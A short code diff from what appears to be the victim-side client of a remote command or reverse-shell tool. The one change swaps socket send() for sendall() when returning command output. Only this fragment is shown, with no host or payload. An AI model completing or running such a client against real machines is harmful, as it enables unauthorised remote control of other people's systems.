@@ -41,7 +41,7 @@ class Victim:
 
             print(f"[SENDING DEBUG] sending result: {output[:50]}...")
 
-            self.client_socket.send(output.encode(self.FORMAT))
+            self.client_socket.sendall(output.encode(self.FORMAT))
 
 
 
